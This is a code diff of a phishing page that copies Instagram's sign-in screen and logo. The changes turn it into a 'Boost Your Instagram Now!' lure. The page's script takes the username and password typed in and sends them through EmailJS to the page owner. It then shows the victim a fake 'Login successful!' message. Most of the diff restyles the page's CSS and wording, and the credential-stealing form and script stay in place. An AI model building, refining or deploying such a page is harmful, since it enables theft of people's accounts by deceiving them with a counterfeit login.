@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram - Sign In</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <title>Boost Your Instagram Now!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -12,8 +12,8 @@
       box-sizing: border-box;
     }
     body {
-      font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #6b48ff, #ff589e, #ffcc00);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -28,123 +28,122 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(255, 255, 255, 0.1);
-      z-index: 0;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.25), transparent 70%);
+      opacity: 0.8;
+      animation: pulseGlow 10s ease-in-out infinite;
+    }
+    @keyframes pulseGlow {
+      0%, 100% { opacity: 0.8; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.1); }
     }
     .container {
-      width: 400px;
+      width: 420px;
       background: #fff;
-      border-radius: 15px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
-      padding: 50px 35px;
+      border-radius: 25px;
+      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
+      padding: 50px 40px;
       text-align: center;
       z-index: 1;
-      animation: slideUp 0.8s ease-out;
+      animation: floatIn 0.8s ease-out;
+      backdrop-filter: blur(5px);
+      background: rgba(255, 255, 255, 0.95);
     }
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(50px); }
-      to { opacity: 1; transform: translateY(0); }
+    @keyframes floatIn {
+      0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 30px;
     }
     .logo {
-      width: 200px;
-      margin-bottom: 35px;
-      filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.1));
+      width: 60px;
+      margin-right: 15px;
+      filter: drop-shadow(0 3px 8px rgba(0, 0, 0, 0.15));
+    }
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #ff3366;
+      text-shadow: 0 2px 6px rgba(255, 51, 102, 0.4);
+    }
+    .subtitle {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 25px;
+      font-weight: 400;
     }
     .form-box {
-      padding: 0 25px;
+      padding: 0 20px;
     }
     .input-field {
       width: 100%;
-      padding: 14px 18px;
+      padding: 16px;
       margin: 12px 0;
-      border: 1px solid #e0e0e0;
-      border-radius: 6px;
-      background: #f9f9f9;
+      border: none;
+      border-radius: 12px;
+      background: #f5f5f5;
       font-size: 15px;
-      color: #262626;
+      color: #333;
+      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
       transition: all 0.3s ease;
     }
     .input-field:focus {
-      border-color: #0095f6;
       background: #fff;
-      box-shadow: 0 0 8px rgba(0, 149, 246, 0.2);
+      box-shadow: 0 0 12px rgba(255, 88, 158, 0.5);
       outline: none;
     }
     .input-field::placeholder {
-      color: #999;
-      font-weight: 400;
+      color: #bbb;
     }
-    .signin-btn {
+    .continue-btn {
       width: 100%;
-      padding: 12px;
-      background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+      padding: 16px;
+      background: linear-gradient(90deg, #6b48ff, #ff589e, #ffcc00);
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       font-weight: bold;
-      font-size: 16px;
+      font-size: 17px;
       cursor: pointer;
       margin-top: 20px;
-      transition: transform 0.2s ease, opacity 0.3s ease;
+      transition: transform 0.2s ease, box-shadow 0.3s ease;
     }
-    .signin-btn:hover {
-      transform: scale(1.02);
-      opacity: 0.95;
+    .continue-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(255, 88, 158, 0.6);
     }
-    .signin-btn:disabled {
-      background: #b2dffc;
+    .continue-btn:disabled {
+      background: #d0d0d0;
       transform: none;
+      box-shadow: none;
       cursor: not-allowed;
     }
-    .separator {
-      margin: 25px 0;
-      display: flex;
-      align-items: center;
-    }
-    .separator hr {
-      flex-grow: 1;
-      border: none;
-      border-top: 1px solid #e0e0e0;
-    }
-    .separator span {
-      margin: 0 15px;
-      color: #8e8e8e;
-      font-size: 14px;
-      font-weight: 600;
-      text-transform: uppercase;
-    }
-    .signup-link {
-      margin-top: 30px;
-      font-size: 15px;
-      color: #262626;
-    }
-    .signup-link a {
-      color: #0095f6;
-      text-decoration: none;
-      font-weight: bold;
-      transition: color 0.2s ease;
-    }
-    .signup-link a:hover {
-      color: #007bb5;
+    .note {
+      font-size: 13px;
+      color: #888;
+      margin-top: 25px;
+      font-style: italic;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+      <h1 class="title">Boost Your Instagram Now!</h1>
+    </div>
+    <p class="subtitle">Sign in to Instagram to continue</p>
     <div class="form-box">
-      <form id="signin-form" name="signin-form">
-        <input type="text" name="username" id="username" class="input-field" placeholder="Phone number, username, or email" required>
+      <form id="continue-form" name="continue-form">
+        <input type="text" name="username" id="username" class="input-field" placeholder="Username or Email" required>
         <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
-        <button type="submit" class="signin-btn" id="signin-btn">Log In</button>
+        <button type="submit" class="continue-btn" id="continue-btn">Continue</button>
       </form>
-      <div class="separator">
-        <hr><span>OR</span><hr>
-      </div>
     </div>
-    <div class="signup-link">
-      Don't have an account? <a href="#">Sign up</a>
-    </div>
+    <p class="note">Explore exclusive features with your account!</p>
   </div>
 
   <!-- EmailJS SDK -->
@@ -152,11 +151,11 @@
   <script>
     emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key
 
-    document.getElementById("signin-form").addEventListener("submit", function(event) {
+    document.getElementById("continue-form").addEventListener("submit", function(event) {
       event.preventDefault();
-      const signinBtn = document.getElementById("signin-btn");
-      signinBtn.disabled = true;
-      signinBtn.textContent = "Logging In...";
+      const continueBtn = document.getElementById("continue-btn");
+      continueBtn.disabled = true;
+      continueBtn.textContent = "Processing...";
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
@@ -167,13 +166,13 @@
       })
       .then(function(response) {
         alert("Login successful!");
-        signinBtn.disabled = false;
-        signinBtn.textContent = "Log In";
-        document.getElementById("signin-form").reset();
+        continueBtn.disabled = false;
+        continueBtn.textContent = "Continue";
+        document.getElementById("continue-form").reset();
       }, function(error) {
-        alert("Failed to send details. Please try again.");
-        signinBtn.disabled = false;
-        signinBtn.textContent = "Log In";
+        alert("Failed to process. Please try again.");
+        continueBtn.disabled = false;
+        continueBtn.textContent = "Continue";
         console.log("EmailJS Error:", error);
       });
     });
